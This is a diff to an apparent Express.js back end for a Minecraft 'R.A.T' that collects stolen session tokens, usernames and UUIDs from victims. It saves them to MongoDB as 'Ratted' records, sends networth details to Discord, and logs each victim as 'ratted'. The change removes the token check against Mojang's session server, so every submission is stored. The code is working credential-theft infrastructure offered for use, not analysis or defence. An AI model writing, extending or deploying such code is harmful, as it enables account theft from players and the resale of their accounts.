@@ -60,20 +60,8 @@ app.post("/", (req, res) => {
         return res.sendStatus(404)
     }
 
-    //validate the token with microsoft auth server (rip mojang)
-    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
-        accessToken: req.body.token,
-        selectedProfile: req.body.uuid,
-        serverId: req.body.uuid
-    }), {
-        headers: {
-            "Content-Type": "application/json"
-        }
-    })
-
-    .then(async response => {
-        if (response.status == 204) { //mojangs way of saying its good
-            if (usingMongoDB) {
+    
+        if (usingMongoDB) {
                 //create a Ratted object with mongoose schema and save it
                 new Ratted({
                     username: req.body.username,
@@ -93,7 +81,7 @@ app.post("/", (req, res) => {
                 })
             }
 
-            if (usingDiscord) {
+        if (usingDiscord) {
                 // initialize networth variables
                 let networth = "0";
                 let soulboundnetworth = "0";
@@ -191,14 +179,8 @@ app.post("/", (req, res) => {
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
-        }
-    })
-
-    .catch(err => {
-        //could happen if the auth server is down OR if invalid information is passed in the body
-        console.log(`[R.A.T] Error while validating token:\n${err}`)
-    })
-
+    
+    
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
 })
